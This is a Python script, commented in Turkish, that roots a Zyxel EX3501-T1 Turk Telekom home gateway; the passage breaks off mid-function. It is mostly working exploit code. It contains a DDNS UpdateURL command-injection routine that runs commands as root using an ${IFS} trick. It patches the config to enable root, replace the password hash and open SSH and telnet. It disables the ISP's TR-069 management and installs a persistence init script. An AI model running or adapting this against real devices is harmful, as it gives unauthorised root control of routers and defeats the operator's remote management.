#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ex3501-root.py — Zyxel EX3501-T1 (Turk Telekom HGW) fabrika reseti sonrasi
root erisimini bastan sonda geri kazandiran tek script.

Egitim / arastirma amaclidir. Yalnizca kendi cihazinizda kullanin.
Hicbir garanti yoktur; sorumluluk kullaniciya aittir.

Akis (2026-08-18 dogrulandi — siraya uy):
  [0] SHA-512 crypt oz-testi
  [1] FTP: config yedek + /data/S99zyroot staging
  [2] Config'e 26+32 yamasi (root Enable, shadow, LocalAccess 22/23, CWMP=false)
      json.dumps(..., indent=2) — baska serializer YASAK
  [3] FTP STOR sonra HEMEN reboot. Araya DAL KOYMA:
      DAL PUT zcmd object-DB'yi dosyaya basar, LocalAccess ezilir.
      CWMP'yi de dosyada kapat (ayri DAL ile kapatip sonra FTP yazma).
  [4] Reboot sonrasi: yama duruyor mu? /var/passwd FTP, telnet root,
      cp /data/S99zyroot -> /etc/init.d + rc.d, dropbear temiz baslat
  SSH exec_command segfault (stok dropbear); interactive pty calisir.

Gereksinimler:
  - Python 3.8+ (standart kutuphane yeterli; telnet/FTP ham socket+ftplib)
  - Istege bagli: pycryptodome (web login/reboot icin), paramiko (SSH dogrulama icin)
      pip install pycryptodome paramiko

Kullanim:
  python3 ex3501-root.py                 # interaktif: IP, admin sifresi, root sifresi sorar
  python3 ex3501-root.py --yes           # onay sormadan devam
  python3 ex3501-root.py --verbose       # her FTP/web/port adimini yaz
  python3 ex3501-root.py --ip 192.168.1.1 --admin-user admin --admin-pass ... --root-pass ...
  python3 ex3501-root.py --self-test     # sadece hash oz-testi
  # Tum kimlik bilgileri CLI'dan geldiyse veya stdin TTY degilse --yes varsayilir.

Not: Script yalnizca yerel agdan (LAN) calisir; cihazin kendi aginizda olmasi gerekir.
"""
import argparse
import base64
import ftplib
import hashlib
import http.cookiejar
import io
import json
import os
import random
import re
import secrets
import socket
import string
import subprocess
import sys
import time
import urllib.error
import urllib.request

# --------------------------------------------------------------------------
# Otomatik bagimlilik kurulumu (venv + pip)
# --------------------------------------------------------------------------
# pycryptodome (FTP'yi DAL ile acmak/web reboot icin) ve paramiko (SSH
# dogrulama) eksikse, script'in yaninda bir .venv olusturur, oraya kurar ve
# kendini o venv'in python'u ile yeniden calistirir. Boylece kullanici elle
# "pip install" yapmak zorunda kalmaz. Atlamak icin --no-venv veya
# EX3501_NO_BOOTSTRAP=1.

_REQUIRED_PKGS = {"pycryptodome": "Crypto", "paramiko": "paramiko"}

VERBOSE = False


def log(msg=""):
    print(msg, flush=True)


def vlog(msg):
    if VERBOSE:
        print("    [dbg] %s" % msg, flush=True)


def _missing_pkgs():
    import importlib.util
    return [pip_name for pip_name, mod in _REQUIRED_PKGS.items()
            if importlib.util.find_spec(mod) is None]


def _bootstrap_deps():
    """Eksik paketleri script yanindaki .venv'e kurar ve o python ile re-exec."""
    if os.environ.get("EX3501_NO_BOOTSTRAP") or "--no-venv" in sys.argv:
        return
    missing = _missing_pkgs()
    if not missing:
        return

    here = os.path.dirname(os.path.abspath(__file__))
    venv_dir = os.path.join(here, ".venv-ex3501")
    if sys.platform == "win32":
        vpy = os.path.join(venv_dir, "Scripts", "python.exe")
    else:
        vpy = os.path.join(venv_dir, "bin", "python")

    already_in_venv = os.path.abspath(sys.executable) == os.path.abspath(vpy)

    # Zaten venv icindeysek ama hâlâ eksikse: pip donanmadi, sonsuz re-exec olmasin
    if already_in_venv:
        print("[!] venv icindeyiz ama su paketler hâlâ yok: %s" % ", ".join(missing))
        print("    Internet baglantisini kontrol edip su komutu deneyin:")
        print("      %s -m pip install %s" % (vpy, " ".join(missing)))
        return

    print("[bootstrap] Eksik paket(ler): %s" % ", ".join(missing))

    if not os.path.exists(vpy):
        print("[bootstrap] venv olusturuluyor: %s" % venv_dir)
        try:
            subprocess.check_call([sys.executable, "-m", "venv", venv_dir])
        except Exception as e:
            print("[bootstrap] venv olusturulamadi (%s); mevcut python ile devam." % e)
            return

    # venv izole oldugu icin (global site-packages gorunmez) gerekli TUM
    # paketleri buraya kur — yalnizca "su an eksik olani" degil.
    to_install = list(_REQUIRED_PKGS)
    print("[bootstrap] pip guncelleniyor + paketler kuruluyor: %s" % ", ".join(to_install))
    try:
        subprocess.check_call([vpy, "-m", "pip", "install", "--upgrade", "pip", "-q"])
        subprocess.check_call([vpy, "-m", "pip", "install", "-q"] + to_install)
    except Exception as e:
        print("[bootstrap] pip kurulumu basarisiz (%s)." % e)
        print("    Internet yoksa: paketleri elle kurup --no-venv ile calistirin.")
        return

    print("[bootstrap] Kuruldu. Script venv ile yeniden baslatiliyor...\n")
    sys.stdout.flush()
    sys.stderr.flush()
    os.execv(vpy, [vpy, os.path.abspath(__file__)] + sys.argv[1:])


_bootstrap_deps()

try:
    from Crypto.Cipher import PKCS1_v1_5, AES
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import pad, unpad
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    HAVE_PARAMIKO = False

CONFIG_PATH = "/data/zcfg_config.json"
PASSWD_CONTENT = (
    "daemon:*:1:1:daemon:/var:/bin/false\n"
    "ubus:x:81:81:ubus:/var/run/ubus:/bin/false\n"
    "nobody:x:99:99:nobody:/nonexistent:/bin/false\n"
    "root:x:0:0:root:/home/root:/bin/sh\n"
    "admin:x:21:21:admin:/home/admin:/usr/bin/zysh\n"
)
INIT_SCRIPT_SH = """#!/bin/sh
# Zyroot: zcmd gec yazdigi zysh'i ezer, dropbear 22+2222
export PATH=/bin:/usr/bin:/usr/sbin:/sbin
fixpw() {
  if [ -f /data/zy_passwd ]; then
    cp /data/zy_passwd /var/passwd
  else
    grep -v ^root: /var/passwd > /tmp/pw2 2>/dev/null
    echo root:x:0:0:root:/home/root:/bin/sh >> /tmp/pw2
    mv /tmp/pw2 /var/passwd
  fi
  if [ -f /data/zy_shadow ]; then
    cp /data/zy_shadow /var/shadow
  fi
}
fixpw
(
  i=0
  while [ $i -lt 24 ]; do
    sleep 5
    grep -q '/bin/sh' /var/passwd 2>/dev/null || fixpw
    grep '^root:' /var/passwd 2>/dev/null | grep -q zysh && fixpw
    i=$((i+1))
  done
  killall dropbear 2>/dev/null
  sleep 1
  /usr/sbin/dropbear -p 22 -P /var/run/dropbear.pid -E
  /usr/sbin/dropbear -p 2222 -P /var/run/dropbear2222.pid -E
) &
exit 0
"""

# --------------------------------------------------------------------------
# SHA-512 crypt (glibc $6$) — saf Python, dis bagimlilik yok
# --------------------------------------------------------------------------

_B64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def _b64_24bit(b2, b1, b0, n, out):
    w = ((b2 & 0xFF) << 16) | ((b1 & 0xFF) << 8) | (b0 & 0xFF)
    for _ in range(n):
        out.append(_B64[w & 0x3F])
        w >>= 6


def sha512_crypt(password: bytes, salt: bytes, rounds: int = 5000) -> str:
    """glibc SHA-crypt ($6$), Drepper spec'i madde 1-22 (OpenSSL passwd -6 ile birebir).
    https://www.akkadia.org/drepper/SHA-crypt.txt"""
    pw, s = password, salt
    pwlen, slen = len(pw), len(s)

    # 1-3: A = SHA512(P + S)
    a = hashlib.sha512(pw + s)
    # 4-8: B = SHA512(P + S + P)
    digest_b = hashlib.sha512(pw + s + pw).digest()
    # 9: her tam 64-byte P blogu icin B'yi A'ya ekle
    a.update(digest_b * (pwlen // 64))
    # 10: kalan N byte icin B'nin ilk N bayti
    if pwlen % 64:
        a.update(digest_b[:pwlen % 64])
    # 11: len(P)'nin her biti icin (LSB'den): 1 -> B, 0 -> P
    cnt = pwlen
    while cnt > 0:
        a.update(digest_b if cnt & 1 else pw)
        cnt >>= 1
    # 12
    digest_a = a.digest()

    # 13-15: DP = SHA512(P * len(P))
    dp = hashlib.sha512(pw * pwlen).digest()
    # 16: P dizisi = DP'nin tekrarından len(P) bayt
    p_seq = (dp * (pwlen // 64 + 1))[:pwlen]
    # 17-19: DS = SHA512(S * (16 + A[0]))
    ds = hashlib.sha512(s * (16 + digest_a[0])).digest()
    # 20: S dizisi = DS tekrarından len(S) bayt
    s_seq = (ds * (slen // 64 + 1))[:slen] if slen else b""

    # 21: rounds dongusu
    for i in range(rounds):
        hc = hashlib.sha512()
        if i & 1:
            hc.update(p_seq)       # b: tek turlarda P
        else:
            hc.update(digest_a)    # c: cift turlarda A/C
        if i % 3:
            hc.update(s_seq)       # d: 3'e bolunmeyenlerde S
        if i % 7:
            hc.update(p_seq)       # e: 7'ye bolunmeyenlerde P
        if i & 1:
            hc.update(digest_a)    # f: tek turlarda A/C
        else:
            hc.update(p_seq)       # g: cift turlarda P
        digest_a = hc.digest()     # h

    # 22e: SHA-512 cikti permutasyonu (spec'teki tablonun b[i] siralamasi)
    b = digest_a
    out = []
    order = [(0, 21, 42), (22, 43, 1), (44, 2, 23), (3, 24, 45),
             (25, 46, 4), (47, 5, 26), (6, 27, 48), (28, 49, 7),
             (50, 8, 29), (9, 30, 51), (31, 52, 10), (53, 11, 32),
             (12, 33, 54), (34, 55, 13), (56, 14, 35), (15, 36, 57),
             (37, 58, 16), (59, 17, 38), (18, 39, 60), (40, 61, 19),
             (62, 20, 41)]
    for i2, i1, i0 in order:
        _b64_24bit(b[i2], b[i1], b[i0], 4, out)
    _b64_24bit(0, 0, b[63], 2, out)
    return "$6$%s$%s" % (salt.decode(), "".join(out))





def self_test():
    """OpenSSL-referansli dogrulama; gecemezse cihaza ASLA hash yazmayiz."""
    vectors = [
        (b"Hello world!", b"foo",
         "$6$foo$X8YnpPR7bKsPCeR0ylqlgdvvgojD1LEEZlhxbBf9IgbmRnsrhNmrzTzcW/JKLCy3/aRtUIhhxpbIBQuPT.o/u1"),
        (b"test password", b"abc123",
         "$6$abc123$2Kc8qEEUxWoCejqAcsC0bYrOhRBlAnv0y6Riwcj04G7LVc2H68.PpshF9rifz04tYzFX8Bv68q/KMMcypnM8s."),
    ]
    ok_all = True
    for pw, salt, want in vectors:
        got = sha512_crypt(pw, salt, 5000)
        ok = got == want
        ok_all &= ok
        print("[self-test] %s: %s" % (salt.decode(), "OK" if ok else "FAIL\n  want: %s\n  got : %s" % (want, got)))
    if not ok_all:
        sys.exit("FATAL: sha512_crypt hatali — hash yazma islemi iptal edildi.")
    print("[self-test] gecti.\n")


# --------------------------------------------------------------------------
# Yardimcilar
# --------------------------------------------------------------------------

def banner(t):
    log("\n" + "=" * 62)
    log("  " + t)
    log("=" * 62)


def dump_config(j):
    """Sadece debug. Cihaza YAZMA — zcmd tam dump'i boot'ta reddedip eskiye doner."""
    return json.dumps(j, ensure_ascii=False, indent=2, separators=(",", ":")).encode()


def _device_json_escape(s):
    """Cihazin kendi JSON'u slash'leri de kacar (\\/) ve newline \\n kalir."""
    return (
        s.replace("\\", "\\\\")
         .replace('"', '\\"')
         .replace("/", "\\/")
         .replace("\n", "\\n")
         .replace("\r", "\\r")
         .replace("\t", "\\t")
    )


def _replace_once(text, old, new, label, diffs):
    n = text.count(old)
    if n == 0:
        vlog("%s: kalip yok" % label)
        return text
    if n != 1:
        raise RuntimeError("%s: 1 eslesme beklendi, %d bulundu — yama iptal" % (label, n))
    diffs.append(label)
    return text.replace(old, new, 1)


def patch_raw_config(raw_text, root_pw):
    """Ham zcfg metninde yalnizca kanitlanmis alanlari degistir.
    json.dumps YASAK: zcmd dump'i boot'ta atar, her sey fabrikaya doner."""
    diffs = []
    s = raw_text

    s = _replace_once(
        s,
        '"Enabled":false,\n            "EnableQuickStart":true,\n            "Page":"",\n            "Username":"root"',
        '"Enabled":true,\n            "EnableQuickStart":true,\n            "Page":"",\n            "Username":"root"',
        "LoginCfg root Enabled -> true",
        diffs,
    )

    shadow_plain = make_shadow_line(root_pw)
    shadow_json = _device_json_escape(shadow_plain)
    shadow_re = re.compile(
        r'("Username":"root",\n(?:            .*\n)*?            "shadow":")([^"]+)(")'
    )
    m = shadow_re.search(s)
    if not m:
        raise RuntimeError("LoginCfg root shadow alani bulunamadi")
    current_plain = json.loads('"%s"' % m.group(2))
    if not shadow_matches(current_plain, root_pw):
        s = s[:m.start()] + m.group(1) + shadow_json + m.group(3) + s[m.end():]
        diffs.append("LoginCfg root shadow -> yeni sifre hash'i")

    s = _replace_once(
        s,
        '"Enable":false,\n          "Username":"root"',
        '"Enable":true,\n          "Username":"root"',
        "TTNET root Enable -> true",
        diffs,
    )
    s = _replace_once(
        s,
        '"Allowed_LA_Protocols":"HTTP,HTTPS"',
        '"Allowed_LA_Protocols":"HTTP,HTTPS,SSH,TELNET"',
        "TTNET root Allowed_LA_Protocols -> +SSH,TELNET",
        diffs,
    )
    s = _replace_once(
        s,
        '"Allowed_LA_Protocols":"HTTP,HTTPS,FTP"',
        '"Allowed_LA_Protocols":"HTTP,HTTPS,FTP,SSH,TELNET"',
        "TTNET admin Allowed_LA_Protocols -> +SSH,TELNET",
        diffs,
    )
    s = _replace_once(
        s,
        '"LocalAccess":{\n        "Port":"80,443,21",\n        "Protocol":"HTTP,HTTPS,FTP",\n        "Enable":true',
        '"LocalAccess":{\n        "Port":"80,443,21,22,23",\n        "Protocol":"HTTP,HTTPS,FTP,SSH,TELNET",\n        "Enable":true',
        "LocalAccess Port/Protocol -> +22,23 / +SSH,TELNET",
        diffs,
    )
    return s, diffs


def raw_critical_ok(raw_text, root_pw=None):
    """Dump'suz dogrulama: cerrahi imzalar dosyada duruyor mu?"""
    if '"Port":"80,443,21,22,23"' not in raw_text:
        return False
    if "SSH,TELNET" not in raw_text and '"Protocol":"HTTP,HTTPS,FTP,SSH,TELNET"' not in raw_text:
        return False
    if '"Enabled":true,\n            "EnableQuickStart":true,\n            "Page":"",\n            "Username":"root"' not in raw_text:
        return False
    if '"Enable":true,\n          "Username":"root"' not in raw_text:
        return False
    if root_pw:
        try:
            j = json.loads(raw_text)
        except Exception:
            return False
        return config_critical_ok(j, root_pw)
    return True


def port_open(ip, p, timeout=2.5):
    sk = socket.socket()
    sk.settimeout(timeout)
    try:
        return sk.connect_ex((ip, p)) == 0
    finally:
        sk.close()


def wait_port(ip, p, deadline_s, want=True, settle=3.0):
    """Port istenen duruma gelene kadar bekle. True=acilmasini bekle."""
    t0 = time.time()
    while time.time() - t0 < deadline_s:
        opened = port_open(ip, p)
        vlog("port %s:%s %s (want %s) t=%.0fs" % (
            ip, p, "acik" if opened else "kapali",
            "acik" if want else "kapali", time.time() - t0))
        if opened == want:
            time.sleep(settle)
            return True
        time.sleep(3)
    return False


def ftp_connect(ip, user, pw, timeout=15):
    vlog("FTP connect %s:21 as %s" % (ip, user))
    ftp = ftplib.FTP()
    ftp.connect(ip, 21, timeout=timeout)
    ftp.login(user, pw)
    vlog("FTP login OK, welcome=%r" % (getattr(ftp, "welcome", "") or "")[:80])
    return ftp


def ftp_read(ftp, path):
    vlog("FTP RETR %s" % path)
    d = io.BytesIO()
    ftp.retrbinary("RETR " + path, d.write, blocksize=131072)
    vlog("FTP RETR %s -> %d byte" % (path, d.tell()))
    return d.getvalue()


def ftp_write(ftp, path, data: bytes):
    vlog("FTP DELE+STOR %s (%d byte)" % (path, len(data)))
    try:
        ftp.delete(path)
    except Exception as e:
        vlog("FTP DELE %s: %s (yoksa normal)" % (path, e))
    ftp.storbinary("STOR " + path, io.BytesIO(data))
    vlog("FTP STOR %s OK" % path)


# --------------------------------------------------------------------------
# Web login + reboot (AES+RSA hibrit protokol, GUI'nin kullandigi sekliyle)
# --------------------------------------------------------------------------

class WebSession:
    def __init__(self, ip, user, pw):
        self.ip = ip
        self.cj = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cj))
        self.opener.addheaders = [("User-Agent", "Mozilla/5.0")]
        self.aes_key_b64 = None
        self.csrf = ""
        self._login(user, pw)

    def _plain_get(self, url):
        return self.opener.open(
            urllib.request.Request("http://%s%s" % (self.ip, url)), timeout=15
        ).read().decode()

    def _login(self, user, pw):
        key = json.loads(self._plain_get("/getRSAPublickKey"))["RSAPublicKey"]
        rsa = RSA.import_key(key)
        payload = json.dumps({
            "Input_Account": user,
            "Input_Passwd": base64.b64encode(pw.encode()).decode(),
            "currLang": "tr",
            "RememberPassword": 0,
            "SHA512_password": False,
        })
        self.aes_key_b64 = base64.b64encode(os.urandom(32)).decode()
        iv_b64 = base64.b64encode(os.urandom(32)).decode()
        key_bytes = base64.b64decode(self.aes_key_b64)
        cipher = AES.new(key_bytes, AES.MODE_CBC, base64.b64decode(iv_b64)[:16])
        content = base64.b64encode(
            cipher.encrypt(pad(payload.encode(), AES.block_size))).decode()
        key_enc = base64.b64encode(
            PKCS1_v1_5.new(rsa).encrypt(self.aes_key_b64.encode())).decode()
        body = json.dumps(
            {"content": content, "key": key_enc, "iv": iv_b64}).encode()
        req = urllib.request.Request(
            "http://%s/UserLogin" % self.ip, data=body,
            headers={"Content-Type": "application/json"})
        vlog("POST /UserLogin (%d byte body)" % len(body))
        raw = self.opener.open(req, timeout=15).read().decode()
        rj = self._decrypt(key_bytes, json.loads(raw))
        if not isinstance(rj, dict) or rj.get("result") != "ZCFG_SUCCESS":
            raise RuntimeError("Web login basarisiz: %s" % str(rj)[:200])
        self.csrf = rj.get("sessionkey", "")
        vlog("web login OK, sessionkey=%s" % (self.csrf or "(yok)"))

    @staticmethod
    def _decrypt(key_bytes, rj):
        if isinstance(rj, dict) and "content" in rj and "iv" in rj:
            iv = base64.b64decode(rj["iv"])[:16]
            pt = unpad(AES.new(key_bytes, AES.MODE_CBC, iv).decrypt(
                base64.b64decode(rj["content"])), AES.block_size)
            return json.loads(pt.decode())
        return rj

    def _dal_request(self, url, obj, method):
        iv = base64.b64encode(os.urandom(16)).decode()
        key_bytes = base64.b64decode(self.aes_key_b64)
        if method == "GET":
            req = urllib.request.Request(
                "http://%s%s" % (self.ip, url),
                headers={"CSRFToken": self.csrf or ""})
        else:
            cipher = AES.new(key_bytes, AES.MODE_CBC, base64.b64decode(iv))
            content = base64.b64encode(
                cipher.encrypt(pad(json.dumps(obj).encode(), AES.block_size))).decode()
            extra = {"content": content, "iv": iv}
            if method == "PUT":
                extra["key"] = ""
            body = json.dumps(extra).encode()
            req = urllib.request.Request(
                "http://%s%s" % (self.ip, url), data=body,
                headers={"Content-Type": "application/json",
                         "CSRFToken": self.csrf or ""},
                method=method)
        vlog("%s %s" % (method, url))
        try:
            resp = self.opener.open(req, timeout=20)
        except urllib.error.HTTPError as e:
            vlog("HTTP %s %s -> %s" % (method, url, e.code))
            resp = e
        raw = resp.read().decode()
        try:
            out = self._decrypt(key_bytes, json.loads(raw))
        except Exception:
            return raw
        if isinstance(out, dict) and out.get("sessionkey"):
            self.csrf = out["sessionkey"]
        return out

    def get(self, url):
        return self._dal_request(url, None, "GET")

    def post(self, url, obj):
        return self._dal_request(url, obj, "POST")

    def put(self, url, obj):
        return self._dal_request(url, obj, "PUT")

    def ddns_inject(self, update_url, wait=10):
        """ez-ipupdate UpdateURL enjeksiyonu — komut root olarak calisir.
        Bosluk yutulabildigi icin payload'da ${IFS} kullan."""
        obj = {
            "Enable": True,
            "ServiceProvider": "userdefined",
            "HostName": "x",
            "UserName": "x",
            "Password": "x",
            "Wildcard": False,
            "Offline": False,
            "UpdateURL": update_url,
            "ConnectionType": "HTTP",
            "AuthenticationResult": "",
            "UpdatedTime": "",
            "DynamicIP": "",
        }
        vlog("DDNS UpdateURL=%r" % update_url)
        r = self.put("/cgi-bin/DAL?oid=ddns", obj)
        vlog("DDNS PUT -> %s" % (str(r)[:160],))
        time.sleep(wait)
        return r

    def ddns_disable(self):
        obj = {
            "Enable": False,
            "ServiceProvider": "userdefined",
            "HostName": "x",
            "UserName": "x",
            "Password": "x",
            "Wildcard": False,
            "Offline": False,
            "UpdateURL": "http://127.0.0.1/",
            "ConnectionType": "HTTP",
            "AuthenticationResult": "",
            "UpdatedTime": "",
            "DynamicIP": "",
        }
        try:
            self.put("/cgi-bin/DAL?oid=ddns", obj)
        except Exception as e:
            vlog("DDNS disable: %s" % e)


def web_reboot(ip, user, pw):
    """Gercek reboot endpoint'i: POST /cgi-bin/Reboot (DAL?oid=reboot CALISMAZ)."""
    s = WebSession(ip, user, pw)
    r = s.post("/cgi-bin/Reboot", {})
    return r


def apply_proven_edits(j, root_pw):
    """26-edit-config + 32-localaccess ile birebir ayni alanlar. Baska bir seye dokunma."""
    diffs = []
    shadow_line = make_shadow_line(root_pw)
    for u in j.get("X_TTNET", {}).get("Users", {}).get("User", []):
        if u.get("Username") == "root":
            if not u.get("Enable"):
                u["Enable"] = True
                diffs.append("TTNET root Enable -> true")
            if u.get("Allowed_LA_Protocols") != "HTTP,HTTPS,SSH,TELNET":
                u["Allowed_LA_Protocols"] = "HTTP,HTTPS,SSH,TELNET"
                diffs.append("TTNET root LA -> +SSH,TELNET")
        if u.get("Username") == "admin":
            if u.get("Allowed_LA_Protocols") != "HTTP,HTTPS,FTP,SSH,TELNET":
                u["Allowed_LA_Protocols"] = "HTTP,HTTPS,FTP,SSH,TELNET"
                diffs.append("TTNET admin LA -> +SSH,TELNET")
    for gp in j.get("X_ZYXEL_LoginCfg", {}).get("LogGp", []):
        for acc in gp.get("Account", []):
            if acc.get("Username") == "root":
                if not acc.get("Enabled"):
                    acc["Enabled"] = True
                    diffs.append("LoginCfg root Enabled -> true")
                if not shadow_matches(acc.get("shadow"), root_pw):
                    acc["shadow"] = shadow_line
                    diffs.append("LoginCfg root shadow")
    for svc in j.get("X_ZYXEL_RemoteManagement", {}).get("Service", []):
        if svc.get("Name") in ("TELNET", "SSH"):
            if svc.get("Mode") != "LAN_ONLY" or not svc.get("Enable"):
                svc["Mode"] = "LAN_ONLY"
                svc["Enable"] = True
                diffs.append("%s Mode -> LAN_ONLY" % svc.get("Name"))
    la = j["X_TTNET"]["UserInterface"]["LocalAccess"]
    if la.get("Port") != "80,443,21,22,23" or "SSH" not in (la.get("Protocol") or ""):
        la["Port"] = "80,443,21,22,23"
        la["Protocol"] = "HTTP,HTTPS,FTP,SSH,TELNET"
        la["Enable"] = True
        diffs.append("LocalAccess +22,23 / +SSH,TELNET")
    ms = j.get("ManagementServer")
    if isinstance(ms, dict):
        if ms.get("EnableCWMP"):
            ms["EnableCWMP"] = False
            diffs.append("EnableCWMP -> false")
        if ms.get("PeriodicInformEnable"):
            ms["PeriodicInformEnable"] = False
            diffs.append("PeriodicInformEnable -> false")
    return diffs


def dal_disable_cwmp(ip, user, pw):
    """ACS boot'ta config'i geri basmasin. oid=tr69 — 17 Agustos zincirinde yoktu
    ama o gun WAN/ACS henuz oturmamisti. Dosyaya dokunmadan DAL ile kapat."""
    s = WebSession(ip, user, pw)
    tr = s.get("/cgi-bin/DAL?oid=tr69")
    objs = tr.get("Object", []) if isinstance(tr, dict) else []
    if not objs:
        log("[!] tr69 okunamadi: %s" % str(tr)[:160])
        return s
    o = objs[0] if isinstance(objs[0], dict) else None
    if not o:
        return s
    o["EnableCWMP"] = False
    o["PeriodicInformEnable"] = False
    try:
        r = s.put("/cgi-bin/DAL?oid=tr69", o)
        log("[+] DAL tr69 CWMP kapatildi: %s" % (str(r)[:100] if not isinstance(r, dict) else r.get("result")))
    except Exception as e:
        log("[!] tr69 PUT: %s (zcmd restart olmus olabilir)" % e)
    return s


def enable_ftp_via_dal(ip, user, pw):
    """FTP kapaliysa web/DAL ile LAN_ONLY ac. FTP gerekmez."""
    s = WebSession(ip, user, pw)
    r = s.get("/cgi-bin/DAL?oid=mgmt_srv")
    objs = r.get("Object", []) if isinstance(r, dict) else []
    if not objs:
        raise RuntimeError("mgmt_srv okunamadi: %s" % str(r)[:200])
    found = False
    for o in objs:
        if o.get("Name") == "FTP":
            o["Mode"] = "LAN_ONLY"
            o["Enable"] = True
            o["LANEnable"] = True
            o["WLANEnable"] = True
            o["WANEnable"] = False
            o["TrustDmEnable"] = False
            found = True
    if not found:
        raise RuntimeError("mgmt_srv icinde FTP servisi yok")
    try:
        out = s.put("/cgi-bin/DAL?oid=mgmt_srv", objs)
        print("[+] DAL PUT mgmt_srv:", str(out)[:120])
    except Exception as e:
        # zcmd servisleri restart ederken baglanti kopabilir — normal
        print("[i] DAL PUT baglanti koptu (beklenen olabilir):", type(e).__name__, str(e)[:80])


def ensure_ftp(ip, user, pw):
    """Port 21 acik degilse DAL ile FTP ac, sonra FTP login dene."""
    if port_open(ip, 21):
        return
    print("[!] FTP (21) kapali — web/DAL ile LAN_ONLY acilacak")
    if not HAVE_CRYPTO:
        sys.exit(
            "FTP kapali ve pycryptodome yok; DAL ile acilamiyor.\n"
            "  pip install pycryptodome  (sonra scripti tekrar calistir)\n"
            "  veya web GUI > Maintenance > Remote MGMT: FTP = LAN only")
    try:
        enable_ftp_via_dal(ip, user, pw)
    except Exception as e:
        sys.exit("FTP acilamadi: %s\nWeb GUI'den FTP'yi LAN only yapip tekrar deneyin." % e)
    print("[*] FTP portu bekleniyor...")
    if not wait_port(ip, 21, 90):
        sys.exit(
            "FTP (21) hâlâ kapali. Web GUI > Maintenance > Remote MGMT:\n"
            "  FTP Enable + Mode = LAN only, sonra scripti tekrar calistirin.")
    print("[+] FTP (21) acildi")



# --------------------------------------------------------------------------
# Telnet surucusu
# --------------------------------------------------------------------------

class TelnetRoot:
    def __init__(self, ip, root_pw, timeout=15):
        self.s = socket.socket()
        self.s.settimeout(timeout)
        self.s.connect((ip, 23))
        time.sleep(1.5)
        self.s.recv(4096)                      # login prompt
        self.s.send(b"root\r\n")
        time.sleep(0.8)
        self.s.recv(4096)
        self.s.send(root_pw.encode() + b"\r\n")
        time.sleep(2.0)
        try:
            self.s.recv(8192)
        except Exception:
            pass

    def cmd(self, c, wait=2.5):
        import select
        self.s.send(c.encode() + b"\n")
        time.sleep(wait)
        buf = b""
        while True:
            r, _, _ = select.select([self.s], [], [], 1)
            if not r:
                break
            try:
                d = self.s.recv(65536)
            except Exception:
                break
            if not d:
                break
            buf += d
        return buf.decode(errors="replace")

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


# --------------------------------------------------------------------------
# Config duzenleme
# --------------------------------------------------------------------------

def make_shadow_line(root_pw):
    salt = "".join(random.choice(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        for _ in range(8)).encode()
    h = sha512_crypt(root_pw.encode(), salt)
    days = int(time.time() // 86400)
    return "root:%s:%d::::::\n" % (h, days)


def shadow_matches(current_shadow, password):
    """Cihazdaki mevcut root hash'i sectigimiz sifreyle uyusuyor mu?
    Mevcut hash'in salt'ini alip sifreyi kendi sha512_crypt'imizle hash'leriz —
    dis bagimlilik (crypt modulu) gerekmez, salt farki sorun olmaz."""
    if not current_shadow:
        return False
    first = current_shadow.strip().split("\n")[0]
    parts = first.split(":")
    if len(parts) < 2 or not parts[1].startswith("$6$"):
        return False
    try:
        _, _, salt, _ = parts[1].split("$", 3)
    except ValueError:
        return False
    # rounds belirtilmediyse 5000 (bu cihazin kullandigi varsayilan)
    if "rounds=" in salt:
        return False  # nadir durum; yeniden yazmak guvenli
    return sha512_crypt(password.encode(), salt.encode()) == parts[1]



def edit_config(j, shadow_line, root_pw=None):
    """Config uzerinde gereken degisiklikleri yapar; (degisiklik listesi) dondurur."""
    diffs = []

    # 1) X_ZYXEL_LoginCfg root hesabi: Enabled + shadow
    for gp in j.get("X_ZYXEL_LoginCfg", {}).get("LogGp", []):
        for acc in gp.get("Account", []):
            if acc.get("Username") == "root":
                if not acc.get("Enabled"):
                    acc["Enabled"] = True
                    diffs.append("LoginCfg root Enabled -> true")
                if not shadow_matches(acc.get("shadow"), root_pw):
                    diffs.append("LoginCfg root shadow -> yeni sifre hash'i")
                    acc["shadow"] = shadow_line

    # 2) X_TTNET.Users.User: root enable + LA protokolleri
    for u in j.get("X_TTNET", {}).get("Users", {}).get("User", []):
        if u.get("Username") == "root":
            if not u.get("Enable"):
                u["Enable"] = True
                diffs.append("TTNET root Enable -> true")
            if "SSH" not in (u.get("Allowed_LA_Protocols") or ""):
                u["Allowed_LA_Protocols"] = "HTTP,HTTPS,SSH,TELNET"
                diffs.append("TTNET root Allowed_LA_Protocols -> +SSH,TELNET")
        if u.get("Username") == "admin":
            if "SSH" not in (u.get("Allowed_LA_Protocols") or ""):
                u["Allowed_LA_Protocols"] = "HTTP,HTTPS,FTP,SSH,TELNET"
                diffs.append("TTNET admin Allowed_LA_Protocols -> +SSH,TELNET")

    # 3) LocalAccess — PORTLARI ACAN ASIL AYAR (bu olmadan 22/23 acilmaz!)
    ui = j.get("X_TTNET", {}).get("UserInterface", {})
    la = ui.get("LocalAccess")
    if not isinstance(la, dict):
        la = {"Port": "80,443,21", "Protocol": "HTTP,HTTPS,FTP", "Enable": True}
        ui["LocalAccess"] = la
    ports = [p.strip() for p in (la.get("Port") or "").split(",") if p.strip()]
    protos = [p.strip() for p in (la.get("Protocol") or "").split(",") if p.strip()]
    ch = False
    for extra in ("22", "23"):
        if extra not in ports:
            ports.append(extra)
            ch = True
    for extra in ("SSH", "TELNET"):
        if extra not in protos:
            protos.append(extra)
            ch = True
    if ch:
        la["Port"] = ",".join(ports)
        la["Protocol"] = ",".join(protos)
        la["Enable"] = True
        diffs.append("LocalAccess Port/Protocol -> +22,23 / +SSH,TELNET")
    # Anahtar yoksa olusturma — bos listeye SSH/TELNET yazmak HTTP/FTP'yi
    # whitelist'ten dusurur. Varsa mevcut listeye ekle.
    if "SupportedProtocols" in la:
        sup = [p.strip() for p in (la.get("SupportedProtocols") or "").split(",") if p.strip()]
        sup_ch = False
        for extra in ("SSH", "TELNET"):
            if extra not in sup:
                sup.append(extra)
                sup_ch = True
        if sup_ch:
